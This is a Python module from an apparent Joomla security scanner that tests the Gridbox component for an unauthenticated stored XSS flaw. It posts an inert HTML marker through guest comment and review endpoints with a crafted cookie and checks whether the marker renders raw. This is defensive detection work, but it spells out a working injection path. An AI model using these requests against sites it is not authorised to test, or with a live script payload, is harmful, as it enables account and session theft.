from __future__ import annotations

import json
from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from . import gridbox_common as gb

CVE_ID = "CVE-2026-105607"
NAME = "Gridbox unauthenticated stored XSS in recent comments/reviews widgets"
COMPONENT = "Gridbox (com_gridbox)"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.4.2"
FIXED_RULE = "Gridbox 2.20.5.0 or later"
COMMENT_PATH = "/index.php?option=com_gridbox&task=comments.sendCommentMesssage"
REVIEW_PATH = "/index.php?option=com_gridbox&task=reviews.sendCommentMesssage"
RECENT_COMMENTS = "/index.php?option=com_gridbox&task=editor.getRecentComments&id=0&maximum=200"
RECENT_REVIEWS = "/index.php?option=com_gridbox&task=editor.getRecentReviews&id=0&maximum=200"


def _guest_cookie(marker: str) -> str:
    value = {
        "name": "GB XSS",
        "email": f"{marker}@example.test",
        "avatar": "",
        "id": 0,
        "type": "guest",
    }
    return "gridbox-comments-user=" + json.dumps(value, separators=(",", ":"))


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    page_id: str = "900001",
) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    marker = "gbxss" + gb.random_suffix()
    payload = f'<b data-gb-xss="{marker}">x</b>'
    cookie = _guest_cookie(marker)
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Cookie": cookie}

    comment = client.request(
        f"{base}{COMMENT_PATH}", method="POST", headers=headers,
        data=form_encode({
            "page_id": page_id, "parent": "0", "message": payload,
            "type": "new", "attachments": "{}", "queue": "{}",
        }),
        timeout=timeout, follow_redirects=False,
    )
    comments_widget = client.get(f"{base}{RECENT_COMMENTS}", timeout=timeout)
    comments_body = comments_widget.get("body", "") or ""
    comment_raw = f'data-gb-xss="{marker}"' in comments_body

    review = client.request(
        f"{base}{REVIEW_PATH}", method="POST", headers=headers,
        data=form_encode({
            "page_id": page_id, "parent": "0", "message": payload,
            "type": "new", "rating": "5", "attachments": "{}", "queue": "{}",
        }),
        timeout=timeout, follow_redirects=False,
    )
    reviews_widget = client.get(f"{base}{RECENT_REVIEWS}", timeout=timeout)
    reviews_body = reviews_widget.get("body", "") or ""
    review_raw = f'data-gb-xss="{marker}"' in reviews_body

    evidence: dict[str, object] = {
        "marker": marker,
        "page_id": page_id,
        "comment_status": comment.get("status"),
        "comment_stored_raw": comment_raw,
        "review_status": review.get("status"),
        "review_stored_raw": review_raw,
    }
    if comment_raw or review_raw:
        widgets = []
        if comment_raw:
            widgets.append("Recent Comments")
        if review_raw:
            widgets.append("Recent Reviews")
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{RECENT_COMMENTS}",
            evidence=evidence,
            detail=(
                "A guest comment/review carrying an inert HTML marker was stored without sanitisation "
                f"and rendered raw by the {', '.join(widgets)} widget. "
                "The probe checks only the unescaped marker tag; no script is executed."
            ),
            action=(
                "Upgrade Gridbox to 2.20.5.0 or later (widget message sanitisation) and review "
                "stored comments/reviews for injected markup."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{RECENT_COMMENTS}",
        evidence=evidence,
        detail=(
            "The stored marker was not rendered raw by the recent comments/reviews widgets "
            f"(comment={comment_raw}, review={review_raw})."
        ),
        action="Verify Gridbox runs 2.20.5.0 or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    plugins: dict | None = None,
    **kwargs: Any,
) -> Finding:
    result = gb.passive_gridbox(
        plugins,
        cve=CVE_ID, name=NAME, component=COMPONENT, affected_rule=AFFECTED_RULE,
        fixed_rule=FIXED_RULE, fixed="2.20.5.0",
        affected_detail="Gridbox is in the affected range; verify the recent comments/reviews widgets render guest markup raw.",
        patched_detail="Gridbox sanitises messages in the recent comments/reviews widgets.",
        action="Upgrade Gridbox to 2.20.5.0 or later and review stored comments/reviews.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only stored-XSS proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    args = aggressive_args or {}
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        page_id=str(args.get("page_id") or "900001"),
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["gridbox"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-105607",
            "https://mysites.guru/blog/gridbox-2-20-5-0-security-fixes/",
        ],
    }
